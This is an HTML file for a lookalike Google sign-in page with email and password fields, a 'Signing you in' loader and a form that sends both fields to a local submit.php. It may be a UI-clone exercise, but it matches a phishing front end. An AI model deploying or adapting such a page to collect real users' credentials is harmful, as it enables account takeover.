<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/jquery-3.3.1.js"></script>
    <script src="assets/js/script.js"></script>
</head>
<body>
<div class="main">
    <div class="overlay"></div>
    <!-- loaders start -->
    <!-- basic loader -->
    <div class="preloader">
        <div class="preloader-bar">
            <div class="preloader-bars"></div>
        </div>
    </div>
    <!-- after signin -->
    <div id="loader-2">
        <div class="three-balls">
            <div class="ball ball1"></div>
            <div class="ball ball2"></div>
            <div class="ball ball3"></div>
        </div>
        <div class="loader-2-text">Signing you in...</div>
    </div>
    <!-- another loader -->
    <!-- loaders end -->

    <!-- three-dot menu -->
    <div class="menu">
        <div class="menu-icon">
            <img src="assets/img/menu.svg" alt="">
        </div>
        <div class="menu-items">
            <ul>
                <li id="about">About</li>
                <li id="overlay-btn">Overlay</li>
                <li>Instagram</li>
                <li>Contact</li>
                <li>etc...</li>
            </ul>
        </div>
    </div>

    <div class="logo">
        <img src="assets/img/logo.png" alt="logo" class="logo-img">
    </div>
    <h1 class="heading">
        <div class="h_main">Sign in</div>
        <div class="h_sub">with your Google Account</div>
    </h1>
    <div class="tag-wrapper">
        <div class="user-tag">
            <img src="assets/img/user.svg" alt="">
            <span class="email-text"></span>
            <img src="assets/img/down-chevron.svg" alt="">
        </div>
    </div>

    <form action="submit.php" method="get">
        <div class="slide-content">



            <div class="content1">
                <div class="input-group">
                    <label class="field-label email-label" for="email" name="email">Email or phone</label>
                    <input type="text" class="field email-field" id="email" placeholder="" name="email">
                </div>

                <span class="forgot">Forgot email?</span>
                <div class="info">
                    Not your computer? Use Guest mode to sign in privately.
                </div>
                <div class="create-next">
                    <span>Create account</span>
                    <button class="btn" id="next" type="submit" name="email_submit" disabled>Next</button>
                </div>
            </div>
            <div class="content2">
                <div class="input-group">
                    <!-- do not change the order -->
                    <!-- or just keep label first and then input -->
                    <label class="field-label password-label" for="password">Enter your password</label>
                    <input type="password" class="field password-field" id="password" placeholder="" name="password">
                    <img class="show-hide-pass" src="assets/img/eye_off.svg" alt="">
                </div>

                <span class="forgot">Forgot password?</span>
                <div class="create-next">
                    <div class="go-back"> <img src="assets/img/go-back-left-arrow.svg" alt=""> Go back</div>
                    <button class="btn" id="sign-in" name="password_submit" disabled>Sign in</button>
                </div>
            </div>

        </div>

    </form>



    <!-- additional features -->
    <div class="about-wrapper">
        <div class="close-about"></div>
        <div class="about-header"></div>
    </div>

</div>
</body>
</html>